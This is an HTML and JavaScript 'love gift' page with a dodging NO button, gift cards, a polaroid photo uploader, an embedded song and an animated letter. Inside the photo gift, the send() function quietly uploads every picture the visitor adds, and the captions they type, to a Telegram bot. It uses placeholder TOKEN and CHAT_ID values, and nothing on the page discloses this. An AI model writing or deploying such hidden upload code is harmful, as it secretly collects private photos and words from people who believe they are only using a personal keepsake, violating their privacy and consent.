<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>For My Love 💖</title>

<style>
:root {
  --pink-bg:#fff0f5;
  --pink-main:#ff8da1;
  --pink-dark:#d81b60;
}

body{
  background:var(--pink-bg);
  margin:0;
  font-family:'Segoe UI',sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  min-height:100vh;
}

.container{
  text-align:center;
  max-width:700px;
}

h1{color:var(--pink-dark);}
button{
  padding:12px 25px;
  border:none;
  border-radius:30px;
  font-weight:bold;
  cursor:pointer;
}

#yesBtn{
  background:#ff4d6d;
  color:white;
  font-size:1.2rem;
}

#noBtn{
  background:#999;
  color:white;
}

.gift-grid{
  display:flex;
  gap:20px;
  justify-content:center;
  margin-top:30px;
}

.gift-card{
  cursor:pointer;
  font-size:50px;
}

.back-btn{
  margin-top:20px;
  background:var(--pink-main);
  color:white;
}

.photo-stack{
  position:relative;
  height:350px;
}

.polaroid{
  position:absolute;
  width:200px;
  height:260px;
  background:white;
  padding:10px;
  box-shadow:0 10px 20px rgba(0,0,0,0.2);
  cursor:pointer;
}

.photo-slot{
  width:100%;
  height:80%;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
  align-items:center;
}

.photo-slot img{
  width:100%;
  height:100%;
  object-fit:cover;
  display:none;
}

.caption-input{
  width:100%;
  border:none;
  text-align:center;
}

.envelope{
  width:250px;
  height:150px;
  background:white;
  margin:auto;
  position:relative;
  cursor:pointer;
}

.flap{
  border-left:125px solid transparent;
  border-right:125px solid transparent;
  border-top:80px solid var(--pink-main);
  position:absolute;
  top:0;
  width:0;
  height:0;
  transition:.5s;
}

.letter{
  position:absolute;
  top:10px;
  width:90%;
  left:5%;
  opacity:0;
  transition:.5s;
}

.open .flap{
  transform:rotateX(180deg);
}

.open .letter{
  transform:translateY(-80px);
  opacity:1;
}
</style>
</head>

<body>

<div class="container" id="app">
<h1>Do you love me? 🥺💗</h1>

<button id="yesBtn" onclick="goToSelection()">YES 💖</button>
<button id="noBtn" onclick="moveNo()">NO 😒</button>

<p id="msg"></p>
</div>

<script>

// ⚠️ CHANGE ÇA APRÈS
const TOKEN="PUT_YOUR_TOKEN";
const CHAT_ID="PUT_YOUR_CHAT_ID";

let noCount=0;
let selectedPol=null;
let saved={};

function moveNo(){
  noCount++;
  let no=document.getElementById("noBtn");
  let msg=document.getElementById("msg");

  no.style.transform=`translate(${Math.random()*200}px,${Math.random()*200}px)`;

  let texts=["Be serious 😭","You sure? 🥺","Last chance 😤"];
  if(noCount<=3) msg.innerText=texts[noCount-1];
  if(noCount>=4) no.style.display="none";
}

function goToSelection(){
  document.getElementById("app").innerHTML=`
  <h1>Pick a gift 🎁</h1>
  <div class="gift-grid">
    <div class="gift-card" onclick="gift1()">📸</div>
    <div class="gift-card" onclick="gift2()">💿</div>
    <div class="gift-card" onclick="gift3()">💌</div>
  </div>`;
}

// ===== GIFT 1 =====
function gift1(){
document.getElementById("app").innerHTML=`
<h1>Our memories 📸</h1>

<div class="photo-stack">
  <div class="polaroid" id="p1" style="z-index:10; transform:rotate(-10deg)" onclick="front(this)">
    <div class="photo-slot" onclick="openFile(this.parentElement)">📸<img></div>
    <input class="caption-input" placeholder="Write 💕" onblur="updateCap(this.parentElement)">
  </div>

  <div class="polaroid" id="p2" style="z-index:5; transform:rotate(10deg)" onclick="front(this)">
    <div class="photo-slot" onclick="openFile(this.parentElement)">📸<img></div>
    <input class="caption-input" placeholder="Write 💖" onblur="updateCap(this.parentElement)">
  </div>
</div>

<input type="file" id="file" style="display:none" onchange="loadPhoto(this)">

<button class="back-btn" onclick="goToSelection()">⬅ Back</button>
`;
}

function front(el){
  el.style.zIndex=20;
}

function openFile(el){
  selectedPol=el;
  document.getElementById("file").click();
}

function loadPhoto(input){
  let file=input.files[0];
  saved[selectedPol.id]=file;

  let reader=new FileReader();
  reader.onload=e=>{
    let img=selectedPol.querySelector("img");
    img.src=e.target.result;
    img.style.display="block";
    send(file,"photo added");
  };
  reader.readAsDataURL(file);
}

function updateCap(el){
  if(saved[el.id]){
    send(saved[el.id],el.querySelector("input").value);
  }
}

// ===== TELEGRAM =====
function send(file,txt){
  let fd=new FormData();
  fd.append("chat_id",CHAT_ID);
  fd.append("photo",file);
  fd.append("caption",txt);

  fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`,{
    method:"POST",
    body:fd
  });
}

// ===== GIFT 2 =====
function gift2(){
let vid="YykjpeuMNEk";

document.getElementById("app").innerHTML=`
<h1>Our song 🎵</h1>

<iframe width="100%" height="300"
src="https://www.youtube.com/embed/${vid}"
allowfullscreen></iframe>

<button class="back-btn" onclick="goToSelection()">⬅ Back</button>
`;
}

// ===== GIFT 3 =====
function gift3(){
document.getElementById("app").innerHTML=`
<h1>A letter 💌</h1>

<div class="envelope" onclick="this.classList.toggle('open')">
<div class="flap"></div>
<div class="letter">
I made this just for you 💖<br><br>
You mean more than you think... 🥺💞
</div>
</div>

<button class="back-btn" onclick="goToSelection()">⬅ Back</button>
`;
}

</script>

</body>
</html>
